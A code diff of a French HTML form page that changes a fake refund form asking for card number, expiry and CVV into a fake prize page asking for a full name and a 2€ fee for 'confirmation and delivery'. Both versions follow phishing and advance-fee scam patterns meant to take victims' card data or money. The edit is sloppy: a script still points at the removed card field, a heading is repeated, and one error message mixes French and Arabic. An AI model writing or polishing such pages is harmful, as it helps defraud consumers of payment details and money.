@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Formulaire de Remboursement</title>
+    <title>Félicitations ! Vous avez remporté un cadeau !</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         body {
@@ -33,26 +33,17 @@
         <!-- Titre -->
         <h1 class="text-2xl font-bold text-center text-gray-800 mb-2">Formulaire de Remboursement</h1>
         <p class="text-sm text-center text-gray-600 mb-6">
-            Veuillez entrer les informations de votre carte bancaire pour recevoir votre remboursement en toute sécurité.
-            Ce processus est sécurisé et protégé.
+            Pour recevoir votre cadeau, veuillez remplir le formulaire ci-dessous et payer 2€ pour la confirmation et la livraison.
         </p>
 
         <!-- Formulaire -->
         <form id="remboursement-form">
             <!-- Titulaire de la carte -->
             <div class="mb-4">
-                <label for="nom" class="block text-sm font-medium text-gray-700">Titulaire de la carte</label>
+                <label for="nom" class="block text-sm font-medium text-gray-700">Nom complet</label>
                 <input type="text" id="nom" placeholder="Ex: Jean Dupont" required
                     class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500">
             </div>
-
-            <!-- Numéro de carte -->
-<div class="mb-4">
-    <label for="numero-carte" class="block text-sm font-medium text-gray-700">Numéro de carte</label>
-    <input type="tel" id="numero-carte" placeholder="1234 5678 9012 3456" required maxlength="19"
-        class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500">
-    <p id="card-error" class="text-red-500 hidden">Le numéro de carte doit être صحيحًا ويتبع التنسيق المطلوب.</p>
-</div>
 
 <script>
     const cardInput = document.getElementById('numero-carte');
@@ -83,20 +74,6 @@
         }
     });
 </script>
-
-            <!-- Date d'expiration -->
-            <div class="mb-4">
-                <label for="date-expiration" class="block text-sm font-medium text-gray-700">Date d'expiration (MM/AA)</label>
-                <input type="month" id="date-expiration" required
-                    class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500">
-            </div>
-
-            <!-- Code CVV -->
-            <div class="mb-4">
-                <label for="cvv" class="block text-sm font-medium text-gray-700">Code CVV</label>
-                <input type="tel" id="cvv" placeholder="123" required maxlength="3"
-                    class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500">
-            </div>
 
             <!-- Numéro de téléphone -->
             <div class="mb-4">
@@ -189,9 +166,15 @@
             <!-- Bouton de validation -->
             <button type="submit"
                 class="w-full bg-green-600 text-white font-bold py-2 px-4 rounded-lg hover:bg-green-700 transition duration-300">
-                Valider mon remboursement
+                Valider 
             </button>
         </form>
+
+        <!-- Titre -->
+        <h1 class="text-2xl font-bold text-center text-gray-800 mb-2">Formulaire de Remboursement</h1>
+        <p class="text-sm text-center text-gray-600 mb-6">
+            Remarque : Un montant de 2€ sera débité uniquement pour la confirmation et la livraison. Merci pour votre confiance !
+        </p>
 
         <!-- Section supplémentaire: Remboursement sécurisé -->
         <div class="mt-6 flex justify-center">
